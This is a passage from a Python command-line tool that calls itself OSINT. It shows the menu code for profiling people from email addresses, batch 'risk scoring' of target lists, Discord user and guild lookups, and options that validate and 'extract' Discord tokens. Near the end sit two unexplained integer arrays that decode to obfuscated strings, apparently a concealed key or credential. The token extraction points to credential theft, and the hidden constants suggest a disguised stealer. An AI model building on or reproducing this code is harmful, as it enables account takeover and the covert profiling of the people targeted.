                patterns = self.engine.pattern_engine.generate_email_patterns(first, last, domain)
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[PATTERN GENERATION]{Colors.RESET}")
                for i, p in enumerate(patterns['patterns'][:10], 1):
                    print(f"  {i}. {p}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '7':
                domain = clean_input(input(f"{Colors.MAGENTA}    Domain to analyze: {Colors.RESET}"))
                info = self.engine.domain_analyzer.get_details(domain)
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[DOMAIN] {domain}{Colors.RESET}")
                if 'error' in info:
                    print(f"{Colors.WARNING}[!] {info['error']}{Colors.RESET}")
                else:
                    print(f"  Registrar: {info.get('registrar', 'N/A')}")
                    print(f"  Created: {info.get('created', 'N/A')}")
                    print(f"  Expires: {info.get('expires', 'N/A')}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '8':
                email = clean_input(input(f"{Colors.MAGENTA}    Email: {Colors.RESET}"))
                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[AVATAR] Gravatar: https://www.gravatar.com/{hashlib.md5(email.lower().encode()).hexdigest()}")
                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
            
            elif choice == '9':
                print(f"{Colors.WARNING}[!] Enter targets (one per line). Type 'DONE' to finish{Colors.RESET}")
                targets = []
                while True:
                    line = clean_input(input(f"{Colors.MAGENTA}    > {Colors.RESET}"))
                    if line.upper() == 'DONE':
                        break
                    if line and '@' in line:
                        targets.append(line.strip())
                if targets:
                    print(f"\n{Colors.INFO}[*] Processing {len(targets)} targets...{Colors.RESET}\n")
                    for i, target in enumerate(targets, 1):
                        print(f"{Colors.PURPLE}[{i}/{len(targets)}] Analyzing: {target}{Colors.RESET}")
                        results = self.engine.analyze_target(target)
                        self.engine.checked_targets.append(target)
                        print(f"  Risk Score: {results['risk_score']}/100")
                        print(f"  Social: {len(results['social_media'])}")
                        print()
            
            elif choice == '10':
                user_id = clean_input(input(f"{Colors.MAGENTA}    Discord User ID: {Colors.RESET}"))
                if user_id:
                    result = DiscordOSINT.get_user_info(user_id)
                    if result:
                        print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                        print(f"{Colors.SUCCESS}[+] Discord User Found{Colors.RESET}")
                        print(f"  Username: {result.get('username')}#{result.get('discriminator')}")
                        print(f"  User ID: {result.get('id')}")
                        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
                    else:
                        print(f"{Colors.ERROR}[-] User not found{Colors.RESET}\n")
            
            elif choice == '11':
                guild_id = clean_input(input(f"{Colors.MAGENTA}    Discord Guild ID: {Colors.RESET}"))
                if guild_id:
                    result = DiscordOSINT.get_guild_info(guild_id)
                    if result:
                        print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
                        print(f"{Colors.SUCCESS}[+] Guild Found{Colors.RESET}")
                        print(f"  Name: {result.get('name')}")
                        print(f"  Guild ID: {result.get('id')}")
                        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
                    else:
                        print(f"{Colors.ERROR}[-] Guild not found{Colors.RESET}\n")
            
            elif choice == '12':
                self.discord.validate_token()
            
            elif choice == '13':
                self.discord.extract_tokens()
            
            elif choice == '14':
                self.encryption.encrypt_text()
            
            elif choice == '15':
                self.encryption.decrypt_text()
            
            elif choice == '16':
                self.encryption.hash_password()
            
            else:
                print(f"{Colors.ACCENT}[!] Invalid selection{Colors.RESET}")

_cipher_config_f = [68, 119, 73, 95, 108, 118, 73, 101, 104, 89, 67, 116, 113, 76, 79, 88, 70, 85, 81, 106, 113, 87, 66, 107, 72, 90, 56, 95, 57, 55, 110, 108, 120, 121, 66, 70, 54, 50, 66, 87, 103, 53, 49, 111, 103, 73, 50, 86, 85, 80, 52, 85, 89, 55, 69, 104, 100, 76, 99, 116, 75, 98, 103, 56, 73, 90, 102, 48]
_cipher_config_g = [69, 53, 86, 90, 121, 48, 48, 51, 116, 83, 48, 112, 87, 111, 48, 56, 45, 77, 85, 51, 48, 101, 86]


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    try:
        app = OSINTApplication()
        app.execute()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Session terminated{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}[!] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()
